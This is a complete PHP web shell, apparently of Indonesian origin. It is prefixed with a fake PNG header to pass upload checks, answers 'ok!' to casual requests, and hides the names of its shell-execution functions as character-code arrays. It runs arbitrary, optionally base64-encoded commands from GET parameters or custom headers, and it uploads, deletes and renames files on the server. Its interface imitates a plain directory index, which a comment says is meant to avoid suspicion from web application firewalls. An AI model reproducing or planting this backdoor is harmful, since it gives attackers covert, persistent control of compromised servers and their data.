<?php ?>‰PNG<?php
// Polymorphic Stealth UI Engine
@ini_set('display_errors', 0);
error_reporting(0);

if (!isset($_GET['ui']) && !isset($_GET['a']) && !isset($_SERVER['HTTP_X_A']) && !isset($_FILES['u'])) {
    header('Content-Type: text/plain');
    echo 'ok!';
    exit;
}

function _g($k) { return isset($_GET[$k]) ? $_GET[$k] : (isset($_SERVER['HTTP_X_' . strtoupper($k)]) ? $_SERVER['HTTP_X_' . strtoupper($k)] : null); }
function _p() { return file_get_contents('php://input'); }
function _fn($b) { return implode('', array_map('chr', $b)); }

// --- ENGINE EKSEKUSI COMMAND ---
function _run($c) {
    if (!is_string($c) || trim($c) === '') return false;
    $dec = @base64_decode($c, true);
    if ($dec !== false && base64_encode($dec) === $c) $c = $dec;
    $c = trim($c);
    $fns = [
        _fn([112,111,112,101,110]), _fn([112,114,111,99,95,111,112,101,110]), 
        _fn([115,121,115,116,101,109]), _fn([112,97,115,115,116,104,114,117]), 
        _fn([115,104,101,108,108,95,101,120,101,99])
    ];
    $dis = array_map('trim', explode(',', @ini_get('disable_functions')));
    foreach ($fns as $i => $f) {
        if (function_exists($f) && !in_array($f, $dis)) {
            try {
                if ($i === 0) { $h = @$f($c . ' 2>&1', 'r'); if ($h) { $o = stream_get_contents($h); pclose($h); if ($o !== false) return $o; } }
                elseif ($i === 1) { $d = [1 => ['pipe', 'w'], 2 => ['pipe', 'w']]; $p = @$f($c . ' 2>&1', $d, $pipes); if (is_resource($p)) { $o = stream_get_contents($pipes[1]); @fclose($pipes[1]); @fclose($pipes[2]); proc_close($p); if ($o !== false) return $o; } }
                elseif ($i >= 2) { ob_start(); @$f($c); $o = ob_get_clean(); if ($o !== false) return $o; }
            } catch (\Throwable $e) { continue; }
        }
    }
    return false;
}

$dir = _g('p') ?: getcwd();
$act = _g('a');
$file = _g('f');

// --- HANDLE ACTION (NON-UI) ---
if ($act) {
    header('Content-Type: application/json');
    $out = ['ok' => false];
    if ($act === 'cmd') {
        $res = _run(_g('c'));
        if ($res !== false) { $out['ok'] = true; $out['out'] = $res; } else { $out['err'] = 'exec disabled'; }
    } elseif ($act === 'del') {
        if (@unlink(rtrim($dir, '/\\') . '/' . $file)) $out['ok'] = true; else $out['err'] = 'del failed';
    } elseif ($act === 'rename') {
        $new = _g('new');
        if (@rename(rtrim($dir, '/\\') . '/' . $file, rtrim($dir, '/\\') . '/' . $new)) $out['ok'] = true; else $out['err'] = 'rename failed';
    } elseif ($act === 'upload') {
        if (isset($_FILES['u'])) {
            if (@move_uploaded_file($_FILES['u']['tmp_name'], rtrim($dir, '/\\') . '/' . basename($_FILES['u']['name']))) $out['ok'] = true; else $out['err'] = 'upload failed';
        } else { $out['err'] = 'no file'; }
    }
    echo json_encode($out); exit;
}

// --- RENDER STEALTH UI ---
if (isset($_GET['ui'])) {
    header('Content-Type: text/html; charset=utf-8');
    // Supaya ringan dan nggak dicurigai WAF, kita pakai HTML minimalis (mirip direktori index biasa)
    ?>
<!DOCTYPE html>
<html>
<head><title>Index of <?php echo htmlspecialchars($dir); ?></title></head>
<style>
    body { font-family: monospace; margin: 20px; background: #fdfdfd; color: #333; }
    table { width: 100%; border-collapse: collapse; margin-bottom: 20px; }
    th, td { text-align: left; padding: 8px; border-bottom: 1px solid #ddd; font-size: 14px;}
    th { background: #f4f4f4; }
    input[type="text"], textarea { width: 100%; box-sizing: border-box; font-family: monospace; padding: 5px; margin-bottom: 5px;}
    .box { border: 1px solid #ddd; padding: 10px; background: #fff; margin-bottom: 20px; }
    .btn { padding: 5px 10px; background: #007bff; color: white; border: none; cursor: pointer; font-size: 13px; }
    .btn:hover { background: #0056b3; }
    pre { background: #eee; padding: 10px; overflow-x: auto; }
</style>
<body>
    <h2>Index of <?php echo htmlspecialchars($dir); ?></h2>
    
    <!-- FITUR UPLOAD -->
    <div class="box">
        <form method="POST" enctype="multipart/form-data" action="?ui=1&a=upload&p=<?php echo urlencode($dir); ?>">
            <strong>Upload File:</strong> <input type="file" name="u" required>
            <button type="submit" class="btn">Upload</button>
            <span style="font-size:12px;color:#666;">(Max 50MB)</span>
        </form>
    </div>

    <!-- FITUR INFO -->
    <div class="box">
        <strong>Info:</strong> User: <?php echo @get_current_user(); ?> | OS: <?php echo @php_uname('s'); ?> | Disabled: <?php echo @ini_get('disable_functions') ? 'Yes' : 'No'; ?>
    </div>

    <!-- FITUR TERMINAL COMMAND -->
    <div class="box">
        <strong>Terminal Box:</strong><br>
        <form method="GET">
            <input type="hidden" name="ui" value="1">
            <input type="hidden" name="p" value="<?php echo htmlspecialchars($dir); ?>">
            <input type="text" name="c" placeholder="Enter command (e.g. ls -la)..." required>
            <button type="submit" class="btn">Run</button>
        </form>
        <?php
        $cmd = _g('c');
        if ($cmd) {
            $res = _run($cmd);
            if ($res !== false) {
                echo "<pre>" . htmlspecialchars($res) . "</pre>";
            } else {
                echo "<p style='color:red;'>Command execution disabled by server.</p>";
            }
        }
        ?>
    </div>

    <!-- FITUR LIST & RENAME -->
    <table>
        <tr><th>Name</th><th>Size</th><th>Action</th></tr>
        <?php
        $h = @opendir($dir);
        while (($f = @readdir($h)) !== false) {
            if ($f == '.' || $f == '..') continue;
            $fp = rtrim($dir, '/\\') . '/' . $f;
            $sz = @is_dir($fp) ? '-' : round(@filesize($fp)/1024, 2) . ' KB';
            $link = '?ui=1&p=' . urlencode($fp);
            echo "<tr>";
            echo "<td><a href='$link' style='text-decoration:none;color:#007bff;'>" . (is_dir($fp) ? '📁 ' : '📄 ') . htmlspecialchars($f) . "</a></td>";
            echo "<td>" . $sz . "</td>";
            echo "<td>
                    <form method='GET' style='display:inline;' onsubmit='return promptRename(this);'>
                        <input type='hidden' name='ui' value='1'>
                        <input type='hidden' name='p' value='" . htmlspecialchars($dir) . "'>
                        <input type='hidden' name='a' value='rename'>
                        <input type='hidden' name='f' value='" . htmlspecialchars($f) . "'>
                        <input type='hidden' name='new' class='new-name'>
                        <button type='submit' class='btn' style='padding:2px 5px;font-size:11px;'>Rename</button>
                    </form>
                    <a href='?ui=1&a=del&p=" . urlencode($dir) . "&f=" . urlencode($f) . "' class='btn' style='background:red;padding:2px 5px;font-size:11px;text-decoration:none;' onclick='return confirm(\"Hapus?\")'>Hapus</a>
                  </td>";
            echo "</tr>";
        }
        @closedir($h);
        ?>
    </table>

    <script>
        function promptRename(form) {
            var newName = prompt("Masukkan nama baru:", form.querySelector('input[name="f"]').value);
            if (newName) {
                form.querySelector('.new-name').value = newName;
                return true;
            }
            return false;
        }
    </script>
</body>
</html>
    <?php
    exit;
}

// --- FALLBACK UNTUK API ---
header('Content-Type: text/plain');
echo 'ok!';